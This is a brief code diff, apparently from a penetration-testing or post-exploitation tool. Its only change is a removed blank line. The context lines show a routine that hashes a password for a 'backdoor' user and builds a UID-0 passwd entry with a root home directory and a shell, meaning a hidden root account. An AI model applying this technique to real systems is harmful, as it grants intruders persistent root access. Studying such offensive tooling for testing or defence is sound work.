@@ -35,7 +35,6 @@ class AppendPasswd(EscalationReplace):
         backdoor_hash = sha512_crypt.using(salt_size=16).hash(backdoor_pass)
 
         if not any(line.startswith(f"{backdoor_user}:") for line in passwd_contents):
-
             # Add our password
             "".join(passwd_contents)
             new_line = f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}\n"""
